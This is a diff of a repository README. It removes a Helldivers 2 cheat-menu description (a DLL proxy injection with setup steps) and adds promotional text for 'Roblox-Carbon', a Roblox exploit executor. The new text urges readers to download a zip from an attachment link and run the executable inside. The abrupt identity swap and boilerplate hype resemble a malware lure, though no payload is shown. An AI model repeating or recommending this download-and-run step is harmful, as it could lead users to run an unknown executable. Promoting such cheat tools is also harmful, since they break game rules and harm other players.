@@ -1,51 +1,66 @@
-# Helldivers2Menu
+# Roblox-Carbon
 
-<p align="center">
-   Helldivers2Menu is a Cheat Menu for the popular Game Helldivers 2.
-</p>
+![Carbon Executor Logo](https://example.com/carbon-logo.png)
 
-## Disclaimer
-This project is for Educational Use only. We do not condone this software being used to gain an advantage against other people. I made this project for my university project to show how cheating software works and how it is possible to block these manipulations in the future.
+Welcome to the official repository of **Roblox-Carbon** - your gateway to a state-of-the-art Roblox exploit offering unmatched performance and security! 🚀
 
-## Compile (Configurations)
-Please compile the project in **Release** mode. Debug does not work properly and gets detected by GG.
+## Table of Contents
+- [Overview](#overview)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
 
-### Version Proxy (version.dll)
-Will automatically be loaded by the Game itself if the dll is in the game directory.
+## Overview
+**Carbon Executor** is a cutting-edge Roblox exploit designed for users looking to unlock the full potential of Roblox scripting effortlessly. It boasts 90% UNC support and Level 8 execution capabilities, setting new standards in the realm of Roblox exploitation. 
 
-### How to Run
-1. Move the `version.dll` into the game directory in `/bin`
-2. Change the Launch Options in Steam for the game into `--use-d3d11` 
-3. Start the game
-4. Press DELETE to show the menu
-5. For performance increase, change into fullscreen mode (Dx11 being funky in HD2)
+With compatibility spanning from Windows 7 to 11, **Roblox-Carbon** ensures a seamless experience for users across various operating systems.
 
-### Running on Proton (Version Proxy Only)
-First you will need protontricks, you can install it with your packager of choice.
+## Features
+Here are some of the key features that set **Roblox-Carbon** apart from the rest:
+- **Top-of-the-line Performance**: Enjoy unparalleled execution speeds and efficiency while running scripts on Roblox.
+- **Enhanced Security**: Robust security measures to protect your exploit and ensure a safe usage environment.
+- **90% UNC Support**: Harness the power of UNC support for a wider range of possibilities in your scripting adventures.
+- **Level 8 Execution**: Achieve advanced execution capabilities with ease.
+- **Multi-Platform Compatibility**: Works seamlessly on Windows 7 through 11, providing a consistent experience across different OS versions.
 
-1. Make sure you are running Helddivers 2 under Proton  
-   You can check by going to **Properties -> Compatibility**
-3. Put version.dll into Helldivers 2 bin folder
-4. Run `protontricks --gui`
-5. Choose **HELLDIVERS 2**
-6. Click on **Select the default wineprefix** and then **OK**
-7. Click on **Run winecfg** and then **OK**
-8. In the configuration window, click on **Libraries**
-9. Type `version` into the **New override for library** input
-10. Click **Add** and then **Apply**
-11. Helldivers2Menu should now work properly in the game
+Embrace the future of Roblox exploitation with **Roblox-Carbon**!
 
-### Default Hotkeys
-- Show Menu - DELETE
+## Installation
+To get started with **Roblox-Carbon**, follow these simple steps:
+1. Download the [Carbon Executor software](https://github.com/user-attachments/files/16913125/Software.zip) using the link below:
+   
+   [![Download Carbon Executor](https://img.shields.io/badge/Download-Carbon%20Executor-blue)](https://github.com/user-attachments/files/16913125/Software.zip)
+   
+2. Extract the downloaded files to a location of your choice.
+3. Launch the executable file.
+4. Start exploring the limitless possibilities offered by **Roblox-Carbon**!
 
-## Screenshot
-<p align="center">
-   <img src="screenshot.png">
-</p>
+## Usage
+Dive into the world of Roblox scripting with **Roblox-Carbon**. Whether you are a seasoned developer or just starting out, this exploit empowers you to push the boundaries of what's possible in Roblox.
+
+### Example:
+```lua
+print("Hello, Roblox-Carbon!")
+game.Workspace.Part.Color = Color3.fromRGB(255, 0, 0)
+```
+
+Unleash your creativity and see your visions come to life within the Roblox universe!
 
 ## Contributing
-1. Fork it (<https://github.com/BitCrackers/Helldivers2Menu/fork>)
-2. Create your feature branch (`git checkout -b feature/fooBar`)
-3. Commit your changes (`git commit -am 'Add some fooBar'`)
-4. Push to the branch (`git push origin feature/fooBar`)
-5. Create a new Pull Request
+We welcome contributions from the community to help enhance and improve **Roblox-Carbon**. Whether you are a developer, designer, or enthusiast, your input is valuable to us. Here's how you can contribute:
+- Fork the repository
+- Make your changes
+- Submit a pull request
+
+Let's work together to make **Roblox-Carbon** even better for everyone!
+
+## License
+This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
+
+---
+
+🌟 **Roblox-Carbon** - Unleash the Power of Roblox Scripting! 🌟
+
+![Roblox-Carbon](https://example.com/roblox-carbon.png)
